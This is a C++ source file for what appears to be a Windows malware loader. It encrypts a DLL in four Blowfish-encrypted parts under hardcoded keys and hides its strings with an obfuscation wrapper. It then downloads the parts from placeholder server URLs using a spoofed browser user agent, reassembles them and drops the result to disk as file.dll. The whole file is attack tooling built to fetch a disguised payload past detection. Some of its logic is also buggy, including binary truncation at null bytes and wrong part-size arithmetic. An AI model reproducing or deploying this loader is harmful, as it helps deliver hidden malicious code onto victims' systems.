#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <WinInet.h>
#pragma comment(lib, "Wininet.lib")
#include "blowfish\blowfish.h"
#include "Stream.h"
#include "crypt.h"
//define 4 different encryption/decryption keys
BLOWFISH blowfish1(Encrypt("5023676649355122"));
BLOWFISH blowfish2(Encrypt("3531814442578142"));
BLOWFISH blowfish3(Encrypt("9919859116484418"));
BLOWFISH blowfish4(Encrypt("0018151237016095"));

bool replace(std::string& str, const std::string& from, const std::string& to)
{
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}

void EncryptFile(fs::path dropped)
{

	//get file
	std::ifstream ifs(dropped.c_str(), std::ios::binary | std::ios::ate);


	//get file size
	int fileSize = ifs.tellg();
	ifs.seekg(0, std::ios::beg);

	std::string data = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());

	size_t partSize = (fileSize) / 4;
	size_t remainder = (fileSize) % 4;
	size_t lastPartSize = partSize - remainder;

	//split data
	std::string part1Buffer(data.begin() + partSize * 0, data.begin() + partSize * 0 + partSize);
	std::string part2Buffer(data.begin() + partSize * 1, data.begin() + partSize * 1 + partSize);
	std::string part3Buffer(data.begin() + partSize * 2, data.begin() + partSize * 2 + partSize);
	std::string part4Buffer(data.begin() + partSize * 3, data.begin() + partSize * 3 + lastPartSize);

	//encrypt data
	std::string part1BufferEncrypted = blowfish1.Encrypt_CBC(part1Buffer);
	std::string part2BufferEncrypted = blowfish2.Encrypt_CBC(part2Buffer);
	std::string part3BufferEncrypted = blowfish3.Encrypt_CBC(part3Buffer);
	std::string part4BufferEncrypted = blowfish4.Encrypt_CBC(part4Buffer);

	//drop encrypted data to disk
	std::ofstream ofs;
	ofs.open(Encrypt("1"), std::ios::binary);
	std::copy(part1BufferEncrypted.begin(), part1BufferEncrypted.end(), std::ostream_iterator<char>(ofs));
	ofs.close();
	ofs.open(Encrypt("2"), std::ios::binary);
	std::copy(part2BufferEncrypted.begin(), part2BufferEncrypted.end(), std::ostream_iterator<char>(ofs));
	ofs.close();
	ofs.open(Encrypt("3"), std::ios::binary);
	std::copy(part3BufferEncrypted.begin(), part3BufferEncrypted.end(), std::ostream_iterator<char>(ofs));
	ofs.close();
	ofs.open(Encrypt("4"), std::ios::binary);
	std::copy(part4BufferEncrypted.begin(), part4BufferEncrypted.end(), std::ostream_iterator<char>(ofs));
	ofs.close();
}

void DLF(fs::path dropped)
{
	//get directory
	fs::path dir = dropped.remove_filename();

	//read each file into a string
	std::ifstream ifs(dir / Encrypt("1"), std::ios::binary);
	std::string data1 = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());
	ifs.close();

	ifs.open(dir / Encrypt("2"), std::ios::binary);
	std::string data2 = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());
	ifs.close();

	ifs.open(dir / Encrypt("3"), std::ios::binary);
	std::string data3 = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());
	ifs.close();

	ifs.open(dir / Encrypt("4"), std::ios::binary);
	std::string data4 = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());
	ifs.close();
	
	//decrypt data
	std::string part1BufferDecrypted = blowfish1.Decrypt_CBC(data1);
	std::string part2BufferDecrypted = blowfish2.Decrypt_CBC(data2);
	std::string part3BufferDecrypted = blowfish3.Decrypt_CBC(data3);
	std::string part4BufferDecrypted = blowfish4.Decrypt_CBC(data4);

	//write decrypted data into one file & drop it to disk
	std::ofstream ofs;
	ofs.open(Encrypt("file.dll"), std::ios::binary);
	std::copy(part1BufferDecrypted.begin(), part1BufferDecrypted.end(), std::ostream_iterator<char>(ofs));
	std::copy(part2BufferDecrypted.begin(), part2BufferDecrypted.end(), std::ostream_iterator<char>(ofs));
	std::copy(part3BufferDecrypted.begin(), part3BufferDecrypted.end(), std::ostream_iterator<char>(ofs));
	std::copy(part4BufferDecrypted.begin(), part4BufferDecrypted.end(), std::ostream_iterator<char>(ofs));
	ofs.close();
}

std::string Decrypt(EncryptedData_t encryptedData)
{
	// decrypts the data
	std::string BufferDecrypted = blowfish1.Decrypt_CBC(encryptedData.a);
	BufferDecrypted += blowfish2.Decrypt_CBC(encryptedData.b);
	BufferDecrypted += blowfish3.Decrypt_CBC(encryptedData.c);
	BufferDecrypted += blowfish4.Decrypt_CBC(encryptedData.d);

	//write data to disk (remove after testing)
	std::ofstream ofs;
	ofs.open(Encrypt("file.dll"), std::ios::binary);
	std::copy(BufferDecrypted.begin(), BufferDecrypted.end(), std::ostream_iterator<char>(ofs));
	ofs.close();

	//return the buffer
	return BufferDecrypted;
}

std::string StreamFile(std::string URL)
{
	//reads the file of the server
	const char* header = Encrypt("Accept: *" "/" "*\r\n\r\n");
	HINTERNET hInterWebz = InternetOpenA(Encrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hURL = InternetOpenUrlA(hInterWebz, URL.c_str(), header, lstrlenA(header), INTERNET_FLAG_DONT_CACHE, 0);

	char* Buffer = new char[100000000]; //100mb
	memset(Buffer, 0, 100000000);
	DWORD BytesRead = 1;

	std::string data;

	if (InternetReadFile(hURL, Buffer, 100000000, &BytesRead))
	{
		data = std::string(Buffer);
	}

	delete[] Buffer;
	InternetCloseHandle(hInterWebz);
	InternetCloseHandle(hURL);

	return data;
}

std::string GetFile()
{
	// enter the url of the 4 encrypted parts which should be uploaded to your server (example: https://yourserver.paste/1)
	std::string data1 = StreamFile(Encrypt("https://yourserver.paste/1")); // file 1
	std::string data2 = StreamFile(Encrypt("https://yourserver.paste/2")); // file 2
	std::string data3 = StreamFile(Encrypt("https://yourserver.paste/3")); // file 3
	std::string data4 = StreamFile(Encrypt("https://yourserver.paste/4")); // file 4

	//decrypt the data and pack it into one file
	std::string decryptedDLL = Decrypt({ data1, data2, data3, data4 });

	//return the decrypted buffer
	return decryptedDLL;
}

int TestDW(fs::path currDir)
{
	std::string decryptedDLL = GetFile();

	//Test output to disk
	std::ofstream ofs;
	ofs.open(currDir / Encrypt("file.dll"), std::ios::binary);
	std::copy(decryptedDLL.begin(), decryptedDLL.end(), std::ostream_iterator<char>(ofs));
	ofs.close();

	system(Encrypt("pause"));
	exit(0);
}